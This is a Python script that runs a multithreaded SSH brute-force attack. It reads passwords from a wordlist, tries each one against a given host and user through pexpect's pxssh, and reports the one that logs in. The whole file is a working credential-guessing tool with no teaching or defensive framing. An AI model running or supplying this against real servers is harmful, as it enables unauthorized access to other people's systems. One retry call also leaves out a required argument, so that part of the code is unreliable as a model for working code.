from pexpect import pxssh
import argparse
import time
from threading import *


maxConnetion = 5
conection_lock = BoundedSemaphore(value=maxConnetion)
Found = False
Fail = 0


def connect(host, user, password, release):
    global Found
    global Fail
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("[+] Password Found: " + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fail += 1
            time.sleep(5)
            connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
            if release:
                conection_lock.release()


def main():
    parser = argparse.ArgumentParser('usage%prog')
    parser.add_argument('-H', dest='tgtHost')
    parser.add_argument('-u', dest='user')
    parser.add_argument('-p', dest='passwdFile')

    args = parser.parse_args()
    host = args.tgtHost
    passwdFile = args.passwdFile
    user = args.user

    if host is None or passwdFile is None or user is None:
        print(parser.usage)
        exit(0)
    fn = open(passwdFile, 'r')
    for line in fn.readlines():
        if Found is True:
            print("[*] Exiting Found")
            exit(0)
        if Fail > 5:
            print("[!] Exiting: Too many Socket Timeouts")
            exit(0)
        conection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == "__main__":
    main()
